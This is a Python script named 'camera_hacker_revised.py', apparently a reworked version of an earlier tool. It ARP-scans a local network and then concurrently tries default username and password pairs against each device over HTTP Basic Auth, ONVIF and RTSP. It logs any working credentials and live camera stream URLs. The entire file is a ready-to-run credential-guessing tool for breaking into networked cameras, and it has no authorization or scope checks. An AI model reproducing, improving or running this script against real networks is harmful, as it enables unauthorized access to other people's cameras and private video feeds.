#!/usr/bin/env python3
# camera_hacker_revised.py

"""
A revised network camera scanner that addresses critical flaws in the original script.

This version includes:
- Dynamic network targeting and interface selection.
- Proper root privilege checks.
- Robust RTSP and ONVIF credential verification methods.
- Concurrent device scanning for improved speed.
- Comprehensive logging for effective debugging.

Required Libraries:
pip install scapy requests onvif-zeep opencv-python netifaces
"""

import os
import sys
import logging
import argparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor

# Third-party imports
import cv2  # For RTSP stream checking
import netifaces
import requests
from onvif import ONVIFCamera
from requests.auth import HTTPBasicAuth
from scapy.all import ARP, Ether, srp

# --- 1. SETUP LOGGING ---
# Replaced silent exception handling with a robust logging mechanism.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# --- 2. DYNAMIC NETWORK CONFIGURATION ---
# Removed hardcoded network and interface values.
def get_default_network_info():
    """
    Auto-detects the network interface and CIDR address for the default gateway.
    """
    try:
        # Get the default gateway
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET]
        gateway_ip, interface = default_gateway[0], default_gateway[1]

        # Find the address details for that interface
        if_addresses = netifaces.ifaddresses(interface)
        af_inet_info = if_addresses[netifaces.AF_INET][0]
        ip_address = af_inet_info['addr']
        netmask = af_inet_info['netmask']

        # Create an IPv4 network object to get the CIDR notation
        network = ipaddress.IPv4Network(f'{ip_address}/{netmask}', strict=False)
        return str(network.with_prefixlen), interface
    except (KeyError, IndexError, ImportError) as e:
        logging.warning(
            f"Could not auto-detect network info: {e}. "
            "Please specify --target and --interface manually."
        )
        return None, None

# --- 3. CORE SCANNING AND CHECKING FUNCTIONS (REVISED) ---

def scan_network(target_cidr, interface):
    """
    Performs an ARP scan on the specified network CIDR and interface.
    """
    logging.info(f"Starting ARP scan on {target_cidr} via interface {interface}...")
    try:
        arp_request = ARP(pdst=target_cidr)
        ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether_frame / arp_request

        result = srp(packet, timeout=3, iface=interface, verbose=0)[0]

        devices = [{'ip': received.psrc} for sent, received in result]
        logging.info(f"ARP scan complete. Found {len(devices)} active device(s).")
        return devices
    except Exception as e:
        logging.error(f"Failed to execute ARP scan: {e}")
        logging.error("Ensure Scapy is installed, the interface is correct, and you have root privileges.")
        return []

def check_http_basic_auth(ip, ports):
    """
    Checks for common HTTP Basic Auth credentials.
    """
    credentials = [('admin', 'admin'), ('user', 'user'), ('admin', 'password'), ('guest', 'guest')]
    for port in ports:
        for username, password in credentials:
            try:
                url = f'http://{ip}:{port}/'
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=3)
                if response.status_code == 200:
                    logging.info(f"SUCCESS [HTTP]: Found credentials for {ip}:{port} -> {username}:{password}")
                    return (username, password)
            except requests.exceptions.RequestException as e:
                # This is expected for wrong credentials or closed ports, so we log at a debug level.
                logging.debug(f"HTTP check failed for {ip}:{port} with user {username}: {e}")
            except Exception as e:
                logging.warning(f"An unexpected error occurred during HTTP check for {ip}:{port}: {e}")
    return None

def check_onvif_credentials(ip):
    """
    Checks for common ONVIF credentials using a more robust method.
    """
    # Using a more robust check (get device time) instead of a state-changing one.
    credentials = [('admin', 'admin'), ('user', 'user'), ('admin', 'password'), ('guest', 'guest')]
    for username, password in credentials:
        try:
            # Added wsdl_dir to help the library find necessary files.
            cam = ONVIFCamera(ip, 80, username, password, wsdl_dir='/etc/onvif/wsdl/')
            # Use a harmless command to verify authentication
            device_time = cam.devicemgmt.GetSystemDateAndTime()
            if device_time:
                logging.info(f"SUCCESS [ONVIF]: Found credentials for {ip} -> {username}:{password}")
                return (username, password)
        except Exception as e:
            logging.debug(f"ONVIF check failed for {ip} with user {username}: {e}")
    return None

def check_rtsp_credentials(ip, ports):
    """
    Checks for common RTSP credentials using OpenCV, which correctly handles the protocol.
    """
    # Removed incorrect requests.get() method.
    credentials = [('admin', 'admin'), ('user', 'user'), ('admin', 'password'), ('guest', 'guest')]
    stream_paths = ['/stream1', '/cam/realmonitor?channel=1&subtype=0', '/1', '/live.sdp'] # Common stream paths
    for port in ports:
        for path in stream_paths:
            for username, password in credentials:
                rtsp_url = f'rtsp://{username}:{password}@{ip}:{port}{path}'
                cap = cv2.VideoCapture(rtsp_url)
                if cap.isOpened():
                    logging.info(f"SUCCESS [RTSP]: Found credentials for {rtsp_url}")
                    cap.release()
                    return (username, password, rtsp_url)
                else:
                    logging.debug(f"RTSP check failed for {rtsp_url}")
                    cap.release()
    return None

# --- 4. CONCURRENT WORKER FUNCTION ---

def scan_device(ip):
    """
    A worker function to run all checks on a single device IP.
    Designed for use with a ThreadPoolExecutor.
    """
    logging.info(f"Scanning device at IP: {ip}")
    found_creds = False

    # Check for common HTTP ports
    http_ports = [80, 8080, 8888]
    http_credentials = check_http_basic_auth(ip, http_ports)
    if http_credentials:
        found_creds = True

    # Check for ONVIF cameras
    onvif_credentials = check_onvif_credentials(ip)
    if onvif_credentials:
        found_creds = True

    # Check for RTSP streams
    rtsp_ports = [554, 8554]
    rtsp_credentials = check_rtsp_credentials(ip, rtsp_ports)
    if rtsp_credentials:
        found_creds = True
    
    if not found_creds:
        logging.info(f"No common credentials found for {ip}")


# --- 5. MAIN EXECUTION BLOCK (REVISED) ---

def main():
    """
    Main function to parse arguments, check privileges, and run the scan.
    """
    # --- Check for root privileges ---
    if os.geteuid() != 0:
        logging.error("This script requires root privileges to perform an ARP scan.")
        logging.error("Please run it with 'sudo'.")
        sys.exit(1)

    # --- Setup argument parser ---
    default_target, default_interface = get_default_network_info()
    parser = argparse.ArgumentParser(
        description="Network Camera Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        '-t', '--target',
        default=default_target,
        help=f"The target network in CIDR notation (e.g., 192.168.1.0/24).\n"
             f"Default (auto-detected): {default_target}"
    )
    parser.add_argument(
        '-i', '--interface',
        default=default_interface,
        help=f"The network interface to use for the scan.\n"
             f"Default (auto-detected): {default_interface}"
    )
    parser.add_argument(
        '-w', '--workers',
        type=int,
        default=10,
        help="Number of concurrent threads to use for scanning. Default: 10"
    )

    args = parser.parse_args()
    if not args.target or not args.interface:
        parser.print_help()
        sys.exit(1)

    # --- Run the scan ---
    devices = scan_network(args.target, args.interface)
    if not devices:
        logging.info("No devices found or scan failed. Exiting.")
        return

    device_ips = [device['ip'] for device in devices]

    # --- Use ThreadPoolExecutor for concurrency ---
    logging.info(f"Starting credential scan on {len(device_ips)} device(s) with {args.workers} workers...")
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        executor.map(scan_device, device_ips)
    
    logging.info("All scanning tasks are complete.")

if __name__ == '__main__':
    # Removed unused `import paramiko`
    main()